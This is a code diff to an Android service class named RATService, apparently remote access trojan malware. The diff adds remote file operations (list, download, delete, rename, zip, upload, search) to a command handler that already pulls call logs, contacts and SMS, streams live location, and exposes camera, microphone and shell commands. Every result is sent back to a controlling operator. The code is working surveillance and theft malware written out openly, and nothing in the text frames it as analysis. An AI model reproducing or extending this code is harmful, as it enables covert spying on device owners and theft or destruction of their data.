@@ -435,7 +435,6 @@ public class RATService extends Service {
                 }
                 break;
                 
-            // NEW: Location streaming commands
             case "location_stream":
                 handleLocationStreamCommand(args);
                 break;
@@ -460,21 +459,15 @@ public class RATService extends Service {
                 }
                 break;
                 
-           case "calls":
-case "CALLS":
-case "get_calls":
-    if (callsModule != null) {
-        String result = callsModule.getCallLogs();
-        // Check if result starts with "ERROR" or is valid JSON
-        if (result.startsWith("ERROR")) {
-            sendCommand("CALLS|" + result);
-        } else {
-            sendCommand("CALLS|" + result);
-        }
-    } else {
-        sendCommand("CALLS|ERROR: Calls module not available");
-    }
-    break;
+            case "calls":
+            case "get_calls":
+                if (callsModule != null) {
+                    String result = callsModule.getCallLogs();
+                    sendCommand("CALLS|" + result);
+                } else {
+                    sendCommand("CALLS|ERROR: Calls module not available");
+                }
+                break;
                 
             case "contacts":
             case "get_contacts":
@@ -486,14 +479,100 @@ case "get_calls":
                 }
                 break;
                 
-            case "files":
+            // FILE OPERATIONS - ADD THESE CASES
+            case "files_list":
             case "list_files":
                 if (fileModule != null) {
-                    String path = args.isEmpty() ? "/sdcard" : args;
-                    String result = fileModule.listFiles(path);
+                    String result = fileModule.listFiles(args);
                     sendCommand("FILES|" + result);
                 } else {
                     sendCommand("FILES|ERROR: File module not available");
+                }
+                break;
+                
+            case "file_get":
+            case "download":
+                if (fileModule != null) {
+                    String result = fileModule.getFile(args);
+                    sendCommand("FILE_GET|" + result);
+                } else {
+                    sendCommand("FILE_GET|ERROR: File module not available");
+                }
+                break;
+                
+            case "file_delete":
+            case "delete":
+                if (fileModule != null) {
+                    String result = fileModule.deleteFile(args);
+                    sendCommand("FILE_DELETE|" + result);
+                } else {
+                    sendCommand("FILE_DELETE|ERROR: File module not available");
+                }
+                break;
+                
+            case "file_rename":
+            case "rename":
+                if (fileModule != null && args.contains("|")) {
+                    String[] parts2 = args.split("\\|", 2);
+                    String result = fileModule.renameFile(parts2[0], parts2[1]);
+                    sendCommand("FILE_RENAME|" + result);
+                } else {
+                    sendCommand("FILE_RENAME|ERROR: Invalid format or module unavailable");
+                }
+                break;
+                
+            case "create_folder":
+            case "mkdir":
+                if (fileModule != null && args.contains("|")) {
+                    String[] parts2 = args.split("\\|", 2);
+                    String result = fileModule.createFolder(parts2[0], parts2[1]);
+                    sendCommand("CREATE_FOLDER|" + result);
+                } else {
+                    sendCommand("CREATE_FOLDER|ERROR: Invalid format or module unavailable");
+                }
+                break;
+                
+            case "file_zip":
+            case "zip":
+                if (fileModule != null) {
+                    String result = fileModule.zipFile(args);
+                    sendCommand("FILE_ZIP|" + result);
+                } else {
+                    sendCommand("FILE_ZIP|ERROR: File module not available");
+                }
+                break;
+                
+            case "file_upload":
+            case "upload":
+                if (fileModule != null && args.contains("|")) {
+                    String[] parts2 = args.split("\\|", 3);
+                    if (parts2.length == 3) {
+                        String result = fileModule.uploadFile(parts2[0], parts2[1], parts2[2]);
+                        sendCommand("FILE_UPLOAD|" + result);
+                    } else {
+                        sendCommand("FILE_UPLOAD|ERROR: Invalid format");
+                    }
+                } else {
+                    sendCommand("FILE_UPLOAD|ERROR: File module not available");
+                }
+                break;
+                
+            case "search_files":
+                if (fileModule != null && args.contains("|")) {
+                    String[] parts2 = args.split("\\|", 2);
+                    String result = fileModule.searchFiles(parts2[0], parts2[1]);
+                    sendCommand("SEARCH_FILES|" + result);
+                } else {
+                    sendCommand("SEARCH_FILES|ERROR: Invalid format");
+                }
+                break;
+                
+            case "storage_info":
+                if (fileModule != null) {
+                    String result = fileModule.getStorageInfo();
+                    sendCommand("STORAGE_INFO|" + result);
+                } else {
+                    sendCommand("STORAGE_INFO|ERROR: File module not available");
                 }
                 break;
                 
@@ -526,16 +605,6 @@ case "get_calls":
                 }
                 break;
                 
-            case "file_get":
-            case "download":
-                if (fileModule != null) {
-                    String result = fileModule.getFile(args);
-                    sendCommand("FILE_GET|" + result);
-                } else {
-                    sendCommand("FILE_GET|ERROR: File module not available");
-                }
-                break;
-                
             case "shell":
             case "exec":
                 if (shellModule != null) {
@@ -547,7 +616,7 @@ case "get_calls":
                 break;
                 
             case "help":
-                sendCommand("HELP|Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files, mic, mic_stop, shell, ping");
+                sendCommand("HELP|Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping");
                 break;
                 
             default:
@@ -556,7 +625,7 @@ case "get_calls":
         }
     }
     
-    // NEW: Handle location streaming commands
+    // Handle location streaming commands
     private void handleLocationStreamCommand(String args) {
         args = args.trim().toLowerCase();
         
@@ -572,7 +641,7 @@ case "get_calls":
         }
     }
     
-    // NEW: Start live location tracking
+    // Start live location tracking
     private void startLocationTracking() {
         if (!checkLocationPermission()) {
             sendCommand("LOCATION_STREAM|error: No location permission");
@@ -653,7 +722,7 @@ case "get_calls":
         }
     }
     
-    // NEW: Stop live location tracking
+    // Stop live location tracking
     private void stopLocationTracking() {
         if (locationManager != null && locationListener != null) {
             locationManager.removeUpdates(locationListener);
@@ -666,7 +735,7 @@ case "get_calls":
         }
     }
     
-    // NEW: Get best last known location
+    // Get best last known location
     private Location getBestLastKnownLocation() {
         Location bestLocation = null;
         
@@ -695,7 +764,7 @@ case "get_calls":
         return bestLocation;
     }
     
-    // NEW: Check location permission
+    // Check location permission
     private boolean checkLocationPermission() {
         return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                 == PackageManager.PERMISSION_GRANTED ||
@@ -703,7 +772,7 @@ case "get_calls":
                 == PackageManager.PERMISSION_GRANTED;
     }
     
-    // NEW: Create JSON from location
+    // Create JSON from location
     private String createLocationJson(Location location) {
         try {
             JSONObject json = new JSONObject();
